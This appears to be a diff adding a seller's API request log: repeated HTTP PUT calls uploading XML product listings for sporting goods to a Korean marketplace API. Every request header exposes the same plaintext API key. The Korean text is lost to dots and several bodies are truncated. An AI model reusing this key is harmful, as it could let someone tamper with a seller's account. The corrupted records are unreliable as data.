+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[New Balance]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950000432]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/NewBalance/950000432/600_600_15NWBMMDBLCKBLCKMCCH_Black.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">New Balance Mens MU950 V2 Mid Umpire Shoes</div><div style="text-align:left;">PROD950000432</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get the same performance and comfort the professionals do in the MU950 V2. A synthetic leather and mesh upper delivers a comfortable molded to your foot fit and unmatched breathability for game long comfort you can count on. The New Balance&reg; MU950 V2 umpire shoe has full-length REVlite RC midsole that offers superior padding and comfort without added weight while a lightweight rubber outsole provides maximum traction and support. FEATURES:<br>Full-length REVlite RC midsole is a higher density midsole that weighs much less than traditional midsoles, the REVlite RC also has shank that offers torsional rigidity<br>Rubber outsole ensures lightweight traction, support and stability that allows you to focus all of you attention on the game <br>Official footwear of on-field Major League Baseball Umpires <br>Weight 10.9 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: New Balance<br>Country of Origin: Imported<br>Style: MU950 <br>Web ID: 15NWBMMDBLCKBLCKMCCH function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 18:21:35</div><div style="text-align:center
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/1554540137 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 16479
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[11297]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Speedo  Mens Relaunch Splice Jammer/950004094 .... ..../..../.... 5.. ......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Speedo]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950004094]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Speedo Mens Relaunch Splice Jammer</div><div style="text-align:left;">PROD950004094</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get lightweight coverage the next time you hit the pool with the Speedo&reg; Relaunch Splice Jammer. Featuring a sleek heather print splice design, these jammers provide comfort and support for beginners up to advanced swimmers. Ideal for swimming laps, these jammers reduce drag and are stretchy, so you get the perfect fit. An interior drawcord delivers a secure fit. You''ll love being in the water with these Speedo&reg; Jammers. <br><br>FEATURES:<br><br><br>Standard fit <br>Highly stretchy <br>Soft and subtle fit for mobility <br>Inner drawcord <br>Front gusset <br>Heather print splice Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Speedo<br>Country of Origin: Imported<br>Style: 8051543<br>Fabric Content: 85% polyester, 15% spandex <br>Web ID: 16SDOMRLNCHJMMRXXMCT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 15:45:08</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-top:10px;margin-bottom:1px;"><div class="divColorName" style="border-bottom:1px solid #dfdfdf;padding:5px;text-align:left;"><span class="spColorName" style="padding-left:5px;">Teal</span></div><div class="divColorImg" styp?}??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/1554540137 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 16479
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[11297]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Speedo  Mens Relaunch Splice Jammer/950004094 .... ..../..../.... 5.. ......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Speedo]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950004094]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Speedo/950004094/600_600_16SDOMRLNCHJMMRXXMCT_Teal.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Speedo Mens Relaunch Splice Jammer</div><div style="text-align:left;">PROD950004094</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Get lightweight coverage the next time you hit the pool with the Speedo&reg; Relaunch Splice Jammer. Featuring a sleek heather print splice design, these jammers provide comfort and support for beginners up to advanced swimmers. Ideal for swimming laps, these jammers reduce drag and are stretchy, so you get the perfect fit. An interior drawcord delivers a secure fit. You''ll love being in the water with these Speedo&reg; Jammers. <br><br>FEATURES:<br><br><br>Standard fit <br>Highly stretchy <br>Soft and subtle fit for mobility <br>Inner drawcord <br>Front gusset <br>Heather print splice Proposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Speedo<br>Country of Origin: Imported<br>Style: 8051543<br>Fabric Content: 85% polyester, 15% spandex <br>Web ID: 16SDOMRLNCHJMMRXXMCT function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 15:45:08</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid #888888;margin-top:10px;margin-bottom:1px;"><div class="divColorName" style="border-bottom:1px solid #dfdfdf;padding:5px;text-align:left;"><span class="spColorName" style="padding-left:5px;">Teal</span></div><div class="divColorImg" sty
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2179186364 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11049
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123476]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Vapor Speed Turf Football Trainers/950000685 .... ....../....../........../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950000685]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Vapor Speed Turf Football Trainers</div><div style="text-align:left;">PROD950000685</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Take your training and workout sessions to a completely new level in the Vapor Speed trainer. A mesh and foam upper delivers lightweight breathability that keeps you cool and comfortable during grueling workouts. The Nike&reg; Vapor Speed Turf football trainer has a Full-length Lunarlon foam midsole that offers impact protection while a rubber lugged outsole ensures the utmost traction and support when its needed most. <br><br>FEATURES:<br><br><br>Mesh and form upper provides a lightweight fit that is also very breathable to keep your feet cool and dry <br>Full-length Lunarlon foam midsole ensures impact protection and cushioning for enhanced comfort <br>Rubber lugged outsole delivers fantastic traction and acceleration during turf specific trainingProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 833408 <br>Web ID: 16NIKMVPRSPDTRFGRFTB function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 18:17:05</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solidpA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2179186364 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 11049
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123476]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[...... Nike  Mens Vapor Speed Turf Football Trainers/950000685 .... ....../....../........../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Nike]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950000685]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Nike/950000685/600_600_16NIKMVPRSPDTRFGRFTB_Red_Silver.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">Nike Mens Vapor Speed Turf Football Trainers</div><div style="text-align:left;">PROD950000685</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Take your training and workout sessions to a completely new level in the Vapor Speed trainer. A mesh and foam upper delivers lightweight breathability that keeps you cool and comfortable during grueling workouts. The Nike&reg; Vapor Speed Turf football trainer has a Full-length Lunarlon foam midsole that offers impact protection while a rubber lugged outsole ensures the utmost traction and support when its needed most. <br><br>FEATURES:<br><br><br>Mesh and form upper provides a lightweight fit that is also very breathable to keep your feet cool and dry <br>Full-length Lunarlon foam midsole ensures impact protection and cushioning for enhanced comfort <br>Rubber lugged outsole delivers fantastic traction and acceleration during turf specific trainingProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: Nike<br>Country of Origin: Imported<br>Style: 833408 <br>Web ID: 16NIKMVPRSPDTRFGRFTB function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !=''''){ var descriptiveattrJson=JSON.parse(dojo.byId(''skuDescriptivattribute'').innerHTML); var descriptiveattrDetails=descriptiveattrJson.descriptive; for(var i=0;i<br><br>.......... : 2018.11.28 18:17:05</div><div style="text-align:center;"><div style=""><div class="divColorImgBox" style="border:1px solid
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010792105 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 19780
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ New Balance  Womens 4040 V1 TPU Fastpitch Softball Cleats/950006808 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[New Balance]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006808]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">New Balance Womens 4040 V1 TPU Fastpitch Softball Cleats</div><div style="text-align:left;">PROD950006808</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Dig in to the batter..s box in the first fastpitch specific 4040. A synthetic leather and mesh upper with perforations and toe protect offer unmatched durability, protection and breathability to keep your feet cool, protected and comfortable. The New Balance&reg; 4040 V1 fastpitch cleat has a REVlite RC midsole that delivers superior padding and comfort while an 8-spike molded TPU outsole layout ensures fantastic traction and speed on the field. FEATURES:<br>Synthetic leather and mesh upper with Toe Protect, delivers a durable protective fit with incredible breathability to keep your feet comfortable and dry all game <br>Debris Free Tongue keeps dirt and pebbles for getting in to you cleats and disrupting your game <br>Full-length REVlite RC midsole is a higher density midsole that weighs much less than traditional midsoles, the REVlite RC also has shank that offers torsional rigidity <br>TPU Outsole plate with secondary traction spikes delivers unmatched acceleration, traction and stability on the diamond <br>Weight: 9.2 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: New Balance<br>Country of Origin: Imported<br>Style: SP4040 <br>Web ID: 15NWBW4040V1FSTPTRBB function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !='pA~??
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2010792105 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 19780
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123487]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[........ New Balance  Womens 4040 V1 TPU Fastpitch Softball Cleats/950006808 .... ....../......]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[New Balance]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006808]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/NewBalance/950006808/600_600_15NWBW4040V1FSTPTRBB_White.jpg]]></prdImage04>
+.
+.<htmlDetail><![CDATA[<div style="text-align:center;"><div style="padding:10px;border:1px solid #cfcfcf;">.............. ........ .... ........ .... ...... .. ...... .... ...... .......... .... ...... ...........</div><div style="height:10px;"></div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="text-align:center;"><img src="http://ai.esmplus.com/fgs_0515/top.jpg"/></div><div style="text-align:center;"><img src="http://222.239.87.67/upload/ProdMsg/MTQyOTE3MDk5OXMtc2hvZXM=.jpg"  /> </div><div style="text-align:center;"></div><div style="text-align:center;"></div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">......</div><div style="text-align:left;">New Balance Womens 4040 V1 TPU Fastpitch Softball Cleats</div><div style="text-align:left;">PROD950006808</div><div style="height:20px;"></div><div style="text-align:left;font-weight:bold;">........</div><div style="text-align:left;"> </div><div style="text-align:left;"><br>Dig in to the batter..s box in the first fastpitch specific 4040. A synthetic leather and mesh upper with perforations and toe protect offer unmatched durability, protection and breathability to keep your feet cool, protected and comfortable. The New Balance&reg; 4040 V1 fastpitch cleat has a REVlite RC midsole that delivers superior padding and comfort while an 8-spike molded TPU outsole layout ensures fantastic traction and speed on the field. FEATURES:<br>Synthetic leather and mesh upper with Toe Protect, delivers a durable protective fit with incredible breathability to keep your feet comfortable and dry all game <br>Debris Free Tongue keeps dirt and pebbles for getting in to you cleats and disrupting your game <br>Full-length REVlite RC midsole is a higher density midsole that weighs much less than traditional midsoles, the REVlite RC also has shank that offers torsional rigidity <br>TPU Outsole plate with secondary traction spikes delivers unmatched acceleration, traction and stability on the diamond <br>Weight: 9.2 ozProposition 65 warning iconWARNING: California Proposition 65California Proposition 65Proposition 65 warning icon<br>Brand: New Balance<br>Country of Origin: Imported<br>Style: SP4040 <br>Web ID: 15NWBW4040V1FSTPTRBB function openWarningPopup() {var skuId = document.getElementById(''sel.ectedSku'').value;var prop = ''''; if(skuId !='
+------end--------
+
+-------LOG_admin_20181129105151_ok.csv-------
+PUT /rest/prodservices/product/2211175172 HTTP/1.1
+Host: api.11st.co.kr
+Accept: */*
+Content-type: text/xml;charset=EUC-KR
+openapikey:6ecc2a319f64860fa941371d4f1037cd
+Content-Length: 10224
+Expect: 100-continue
+
+<?xml version="1.0" encoding="euc-kr" ?> 
+<Product>
+.<abrdBrandYn>Y</abrdBrandYn> 
+.<abrdBuyPlace>D</abrdBuyPlace> 
+<!-- 1........./........ ....:Start   --> 
+.
+    <selMthdCd>01</selMthdCd> 
+    <dispCtgrNo><![CDATA[123476]]></dispCtgrNo> 
+    <originDispCtgrNo>1</originDispCtgrNo> 
+<!-- 1........./........ ....:End   --> 
+<!-- 2............. ....:Start   --> 
+    <prdNm><![CDATA[.... Army adidas Mens adizero 5-Star 6.0 X Kevlar  Dipped Football Cleats/950006492 .... ....../....]]></prdNm> 
+    <advrtStmt><![CDATA[100%....,........,../..........]]></advrtStmt> 
+    <brand><![CDATA[Army]]></brand>
+    <orgnTypCd>03</orgnTypCd> 
+    <orgnTypDtlsCd></orgnTypDtlsCd> 
+    <orgnNmVal>.... .. ........</orgnNmVal> 
+    <sellerPrdCd><![CDATA[PROD950006492]]></sellerPrdCd> 
+    <suplDtyfrPrdClfCd>01</suplDtyfrPrdClfCd> 
+    <forAbrdBuyClf>02</forAbrdBuyClf> <!--................ ....-->
+    <prdStatCd>01</prdStatCd>
+    
+    <minorSelCnYn>Y</minorSelCnYn> 
+.<prdImage01><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage01>
+.<prdImage02><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage02>
+.<prdImage03><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage03>
+.<prdImage04><![CDATA[http://222.239.87.67/magicview/Army/950006492/600_600_16ADIMDZR5STR60XKDLT_White.jpg]]></prdImage04>
+.
